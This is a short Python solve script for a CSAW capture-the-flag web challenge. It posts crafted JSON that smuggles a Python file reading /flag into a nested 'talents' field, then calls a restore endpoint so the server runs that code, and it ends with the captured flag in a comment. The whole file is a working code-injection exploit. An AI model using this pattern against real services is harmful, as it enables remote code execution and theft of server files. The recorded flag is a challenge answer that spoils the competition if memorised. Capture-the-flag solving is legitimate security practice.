import requests
url = 'https://charliesangels.ctf.csaw.io'
s = requests.Session()
angelData = s.get(f'{url}/angel').json()
print(angelData)
angel = angelData['angel']
id = angelData['id']

backupData = {
    'id': id,
    'angel': {
      'talents': {
        'filename': f'{id}.py',
        'buffer': 'print(open(\'/flag\').read()[1:])',
        'content_type': 'text/x-python'
      }
    }
}

s.post(f'{url}/angel', json=backupData)
print(s.get(f'{url}/restore').text)
# csawctf{good_morning_angels!_GOOD_MORNING_CHARLIE!!}
